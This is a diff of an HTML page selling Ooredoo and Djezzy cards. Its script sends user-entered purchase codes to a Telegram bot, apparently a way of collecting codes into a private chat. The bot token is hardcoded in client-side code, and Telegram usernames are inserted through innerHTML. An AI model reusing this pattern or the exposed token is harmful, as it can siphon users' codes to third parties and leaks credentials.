@@ -7,10 +7,7 @@
 <style>
 body {
 font-family: Arial, sans-serif;
-background-color: #ffffff;
-color: #000000;
 }
-
 .container {
 width: 80%;
 margin: 10px auto;
@@ -19,12 +16,10 @@ border: 1px solid #ccc;
 border-radius: 10px;
 box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
 }
-
 #info {
 font-size: 18px;
 color: #666;
 }
-
 .popup {
 position: fixed;
 top: 0;
@@ -36,7 +31,6 @@ display: none;
 justify-content: center;
 align-items: center;
 }
-
 .popup-content {
 background-color: #fff;
 padding: 10px;
@@ -45,7 +39,14 @@ box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
 width: 80%;
 max-width: 500px;
 }
-
+input[type="text"],
+input[type="email"] {
+width: 95%;
+height: 20px;
+margin-bottom: 10px;
+padding: 5px;
+border: 1px solid #ccc;
+}
 .order-button {
 background-color: #4CAF50;
 color: #fff;
@@ -54,11 +55,9 @@ border: none;
 border-radius: 5px;
 cursor: pointer;
 }
-
 .order-button:hover {
 background-color: #3e8e41;
 }
-
 .alert-box {
 position: fixed;
 top: 50%;
@@ -72,11 +71,9 @@ width: 80%;
 max-width: 500px;
 display: none;
 }
-
 .alert-box h2 {
 margin-top: 0;
 }
-
 .alert-box button {
 background-color: #4CAF50;
 color: #fff;
@@ -85,28 +82,25 @@ border: none;
 border-radius: 5px;
 cursor: pointer;
 }
-
 .alert-box button:hover {
 background-color: #3e8e41;
 }
 </style>
 </head>
-
 <body>
 <div class="container" id="user-name"></div>
 <div class="container">
 <h1>Ooredoo</h1>
 <p>Carte d'expédition 100.00DA</p>
 <p>Prix : 100 Da</p>
-<label for="code">Entrer le code d'achat:</label>
-<input type="text" id="code" name="code">
+<input type="text" id="code" name="code" placeholder="Entrer le code d'achat">
 </br>
 </br>
 <button class="order-button" onclick="order(this)">Order</button>
 </div>
 <div class="container">
 <h1>Djezzy</h1>
-<p>Carte d'expédition 100.00  DA</p>
+<p>Carte d'expédition 100.00 DA</p>
 <p>Prix : 100 Da</p>
 <label for="code">Entrer le code d'achat:</label>
 <input type="text" id="code" name="code">
@@ -132,80 +126,81 @@ background-color: #3e8e41;
 </div>
 </div>
 <div class="alert-box" id="alert-box">
-<p><h2>Erreur!</h2>
-</br>Veuillez entrer le code d'achat!</p>
+<p><h2>Erreur!</h2> </br>Veuillez entrer le code d'achat!</p>
 <button onclick="hideAlert()">Fermer</button>
 </div>
 <script>
 const telegramToken = '7899966999:AAFaQeVG7ZZWoE6Fo1NoR7yJmmgK_38u-Cs';
 const chatId = '5365425194';
-
 function order(element) {
-const container = element.parentNode;
-const produit = container.querySelector('h1').textContent;
-const description = container.querySelector('p:nth-child(2)').textContent;
-const prix = container.querySelector('p:nth-child(3)').textContent;
-const code = container.querySelector('input[type="text"]').value;
-if (code !== '') {
-const message = `💵Nouvel achat :\n Produit: ${produit}\n Description: ${description}\n Prix: ${prix}\n Code: ${code}`;
-sendTelegramMessage(message);
-showPopup();
-} else {
-showAlert();
-}
+  const container = element.parentNode;
+  const produit = container.querySelector('h1').textContent;
+  const description = container.querySelector('p:nth-child(2)').textContent;
+  const prix = container.querySelector('p:nth-child(3)').textContent;
+  const code = container.querySelector('input[type="text"]').value;
+  const userName = document.getElementById('user-name').textContent;
+
+  if (code !== '') {
+    const message = `💵Nouvel achat :\n Nom d'utilisateur: ${userName}\n Produit: ${produit}\n Description: ${description}\n Prix: ${prix}\n Code: ${code}`;
+    sendTelegramMessage(message);
+    showPopup();
+  } else {
+    showAlert();
+  }
 }
 
 function sendTelegramMessage(message) {
-const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-const params = {
-chat_id: chatId,
-text: message,
-};
-fetch(url, {
-method: 'POST',
-headers: {
-'Content-Type': 'application/json',
-},
-body: JSON.stringify(params),
-})
-.then((response) => response.json())
-.then((data) => console.log(data))
-.catch((error) => console.error(error));
+  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+  const params = {
+    chat_id: chatId,
+    text: message,
+  };
+
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(params),
+  })
+    .then((response) => response.json())
+    .then((data) => console.log(data))
+    .catch((error) => console.error(error));
 }
 
 function showPopup() {
-document.getElementById('popup').style.display = 'flex';
+  document.getElementById('popup').style.display = 'flex';
 }
 
 function hidePopup() {
-document.getElementById('popup').style.display = 'none';
+  document.getElementById('popup').style.display = 'none';
 }
 
 function showAlert() {
-document.getElementById('alert-box').style.display = 'flex';
+  document.getElementById('alert-box').style.display = 'flex';
 }
 
 function hideAlert() {
-document.getElementById('alert-box').style.display = 'none';
+  document.getElementById('alert-box').style.display = 'none';
 }
 
 function getUpdates() {
-const url = `https://api.telegram.org/bot${telegramToken}/getUpdates`;
-fetch(url)
-.then(response => response.json())
-.then(data => {
-const updates = data.result;
-updates.forEach(update => {
-const message = update.message;
-const userName = message.from.username;
-const chatId = message.chat.id;
-console.log(`Nom d'utilisateur : ${userName}`);
-console.log(`ID de chat : ${chatId}`);
-// Mettre à jour le nom d'utilisateur dans la page
-document.getElementById('user-name').innerHTML = `${userName}`;
-});
-})
-.catch(error => console.error(error));
+  const url = `https://api.telegram.org/bot${telegramToken}/getUpdates`;
+  fetch(url)
+    .then(response => response.json())
+    .then(data => {
+      const updates = data.result;
+      updates.forEach(update => {
+        const message = update.message;
+        const userName = message.from.username;
+        const chatId = message.chat.id;
+        console.log(`Nom d'utilisateur : ${userName}`);
+        console.log(`ID de chat : ${chatId}`);
+        // Mettre à jour le nom d'utilisateur dans la page
+        document.getElementById('user-name').innerHTML = `${userName}`;
+      });
+    })
+    .catch(error => console.error(error));
 }
 
 // Appeler la fonction getUpdates toutes les 5 secondes
